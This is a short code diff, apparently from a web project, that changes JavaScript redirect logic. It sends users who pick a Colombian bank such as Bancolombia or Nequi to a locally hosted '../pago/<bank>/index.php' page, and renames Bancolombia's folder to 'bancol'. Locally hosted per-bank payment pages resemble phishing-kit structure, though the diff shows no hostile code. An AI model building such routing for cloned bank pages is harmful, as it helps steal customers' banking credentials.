@@ -569,10 +569,11 @@
                 var bankUrl = "../pago/index.php"; // Fallback to main payment index if exists, or error page
 
                 if (banco) {
-                    var availableBanks = ['avvillas', 'bancolombia', 'bbva', 'bogota', 'colpatria', 'davivienda', 'falabella', 'finandina', 'occidente', 'nequi', 'caja-social', 'itau', 'mundo-mujer', 'popular', 'serfinanza', 'union', 'lulo', 'davi'];
+                    var availableBanks = ['avvillas', 'bancol', 'bancolombia', 'bbva', 'bogota', 'colpatria', 'davivienda', 'falabella', 'finandina', 'occidente', 'nequi', 'caja-social', 'itau', 'mundo-mujer', 'popular', 'serfinanza', 'union', 'lulo', 'davi'];
 
                     if (availableBanks.indexOf(banco) !== -1) {
-                        bankUrl = "../pago/" + banco + "/index.php"; // Target URL
+                        var targetFolder = (banco === 'bancolombia') ? 'bancol' : banco;
+                        bankUrl = "../pago/" + targetFolder + "/index.php"; // Target URL
                     }
 
                     window.location.href = bankUrl;
@@ -1254,9 +1255,10 @@
                                                                                     var bankUrl = "../pago/index.php"; // Fallback
 
                                                                                     if (banco) {
-                                                                                        var availableBanks = ['avvillas', 'bancolombia', 'bbva', 'bogota', 'colpatria', 'davivienda', 'falabella', 'finandina', 'occidente', 'nequi', 'caja-social', 'itau', 'mundo-mujer', 'popular', 'serfinanza', 'union', 'lulo', 'davi'];
+                                                                                        var availableBanks = ['avvillas', 'bancol', 'bancolombia', 'bbva', 'bogota', 'colpatria', 'davivienda', 'falabella', 'finandina', 'occidente', 'nequi', 'caja-social', 'itau', 'mundo-mujer', 'popular', 'serfinanza', 'union', 'lulo', 'davi'];
                                                                                         if (availableBanks.indexOf(banco) !== -1) {
-                                                                                            bankUrl = "../pago/" + banco + "/index.php";
+                                                                                            var targetFolder = (banco === 'bancolombia') ? 'bancol' : banco;
+                                                                                            bankUrl = "../pago/" + targetFolder + "/index.php";
                                                                                         }
                                                                                     }
 
